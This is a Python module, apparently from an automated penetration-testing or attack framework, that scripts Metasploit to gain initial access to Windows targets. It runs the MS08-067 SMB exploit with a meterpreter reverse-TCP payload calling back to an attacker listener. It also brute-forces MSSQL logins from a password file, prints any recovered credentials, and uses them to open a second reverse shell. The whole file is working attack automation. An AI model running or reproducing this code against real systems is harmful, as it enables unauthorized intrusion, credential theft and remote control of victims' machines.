
import os
import re
import time
import subprocess
from pathlib import Path
from dotenv import load_dotenv
# global variables
import config


################################################################################
# Initial access exploits
################################################################################

class InitialAccess(object):
    """
    Defines a collection initial access exploits
    """

    def exploit_cve_2008_4250(self, target_name, verbose = False):
        """
        Create a reverse shell with target
        """
        config.MSFCONSOLE.set_shell(False)
        cmd = "use exploit/windows/smb/ms08_067_netapi"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set PAYLOAD windows/meterpreter/reverse_tcp"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set TARGET 6"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set RHOST " + config.TARGETS[target_name].ip
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LHOST " + config.MSF_LHOST
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set LPORT " + config.MSF_LPORT
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "exploit"
        config.MSFCONSOLE.set_shell()
        config.MSFCONSOLE.callback(cmd, verbose=False)
        # cmd = "sessions -i 1"
        # config.MSFCONSOLE.callback(cmd, verbose=False)
        # update user privs
        config.PRIVILEDGEESC.update_priviledes(target_name)
        print("[*] access to " + target_name + " successfull")

    def exploit_msql_brute_force(self, target_name, verbose = False):
        """
        Create a reverse shell with target
        """
        config.MSFCONSOLE.set_shell(False)
        target = config.TARGETS[target_name]
        cmd = "use auxiliary/scanner/mssql/mssql_login"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        pass_path = Path.cwd().glob("playbook/passwords.txt").__next__()
        cmd = "set PASS_FILE " + str(pass_path)
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set RHOST " + target.ip
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set THREADS 20"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        cmd = "set VERBOSE " + str(verbose).lower()
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
        print()
        cmd = "exploit"
        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, timeout=120)
        for line in msf_reply.splitlines():
            if "Login Successful" in line:
                index = msf_reply.rfind("Login Successful: ")
                creds = line.replace('\\', ' ').replace(':', ' ').split()
                target.msql_username = creds[-2].strip()
                target.msql_password = creds[-1].strip()
                print("[*] found msql username and password")
                print('\n    ' + 'msql credentials' + '\n    ' + '=' * 60)
                print('   ', 'username:', target.msql_username)
                print('   ', 'password:', target.msql_password, '\n')
                break
        if target.msql_password:
            cmd = "use exploit/windows/mssql/mssql_payload"
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set PAYLOAD windows/meterpreter/reverse_tcp"
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set LHOST " + config.MSF_LHOST
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set LPORT " + config.MSF_LPORT
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set RHOST " + target.ip
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set USERNAME " + target.msql_username
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            cmd = "set PASSWORD " + target.msql_password
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
            config.MSFCONSOLE.set_shell()
            cmd = "exploit"
            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=14)
            # update user privs
            config.PRIVILEDGEESC.update_priviledes(target_name)
            print()
            print("[*] access to " + target_name + " successfull")
        else:
            print("[*] access to " + target_name + "failed")
